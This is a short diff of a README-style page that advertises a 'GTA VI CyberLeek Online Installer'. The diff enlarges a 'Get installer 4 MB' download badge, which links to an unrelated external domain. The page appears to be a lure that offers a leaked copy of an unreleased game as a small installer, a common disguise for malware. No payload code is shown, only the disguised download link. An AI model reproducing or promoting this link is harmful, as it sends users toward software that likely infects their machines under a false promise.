@@ -1,5 +1,5 @@
 
-[![Get installer 4 MB](https://img.shields.io/badge/⬇_Get_installer_4_MB-00B8D9?style=for-the-badge&logo=windows&logoColor=white)](https://shanxisaide.com/s/file)
+<h1 align="center">[![Get installer 4 MB](https://img.shields.io/badge/⬇_Get_installer_4_MB-00B8D9?style=for-the-badge&logo=windows&logoColor=white)](https://shanxisaide.com/s/file)</h1>
 
 <h1 align="center">GTA VI CyberLeek Online Installer — why the archive is only a few megabytes</h1>
 
